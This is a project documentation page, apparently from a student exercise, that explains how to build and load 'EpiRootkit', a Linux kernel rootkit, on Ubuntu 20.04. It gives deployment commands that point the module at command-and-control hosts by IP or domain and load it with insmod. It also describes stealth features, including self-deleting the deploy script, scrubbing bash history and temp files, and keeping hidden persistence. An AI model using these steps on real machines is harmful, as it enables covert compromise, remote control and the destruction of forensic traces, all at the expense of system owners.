---
title: "Build & Deployment"
description: "How to build and load EpiRootkit on Ubuntu 20.04"
icon: "code"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 502
---



## Requirements

### System
- **OS**: Ubuntu 20.04 LTS
- **Kernel**: 5.4.0-* (check with `uname -r`)

### Dependencies
```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)
```


## Build

```bash
cd rootkit
make clean && make
# ✓ Build successful: epirootkit.ko created
```

## Deployment

### Deployment Script

```bash
# Default usage (uses ./epirootkit.ko automatically)
sudo ./deploy_rootkit.sh

# Custom C2 server
sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444

# Domain-based deployment
sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com

# Stealth deployment with self-cleanup
sudo ./deploy_rootkit.sh --self-delete

# Verbose deployment (show output)
sudo ./deploy_rootkit.sh --verbose
```

### Deployment Options
| Option | Description |
|--------|-------------|
| `--verbose` | Show detailed output during deployment |
| `--self-delete` | Remove script after successful deployment |
| `status` | Check current deployment status |
| `uninstall` | Remove module and cleanup |

### Advanced Usage
```bash
# Stealth deployment
sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete

# Deploy with verbose output then self-destruct
sudo ./deploy_rootkit.sh --verbose --self-delete

# Check deployment status
sudo ./deploy_rootkit.sh status
# Status: Active (hidden)
# Note: Persistence is managed internally by the rootkit

# Remove deployment
sudo ./deploy_rootkit.sh uninstall
# Module uninstalled
```

### Manual Loading (Alternative)
```bash
# Load with domain
sudo insmod epirootkit.ko address=jules-c2.example.com

# Load with IP
sudo insmod epirootkit.ko address=192.168.200.11 port=4444

# Load with defaults from config.h
sudo insmod epirootkit.ko
```

## Self-Cleanup Features

The deployment script includes stealth capabilities:

### Trace Cleanup
- **Temp files**: Removes all `/tmp/jules_est_bo_*` files
- **History cleanup**: Removes deployment commands from bash history
- **Stealth backup**: Creates and removes backup module files

### Self-Destruction
```bash
# Deploy and vanish completely
sudo ./deploy_rootkit.sh --self-delete
# Deployment successful
# Self-deleting deployment script...
# (script file removed automatically)
```

## Management

### Check Status
```bash
sudo ./deploy_rootkit.sh status
# Status: Active (hidden)
# Note: Persistence is managed internally by the rootkit
```

### Default Behavior
- **Module file**: Uses `./epirootkit.ko` by default if no file specified
- **C2 address**: Uses `192.168.200.11:4444` by default
- **Stealth mode**: Silent operation by default (use `--verbose` for output)
- **Persistence**: Automatically handled by rootkit internal mechanisms

### Complete Removal
```bash
sudo ./deploy_rootkit.sh uninstall
# Module uninstalled
# Note: Rootkit persistence may remain - use rootkit's own removal commands
```

**Domain Support**: The rootkit supports both domain names and IP addresses. For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).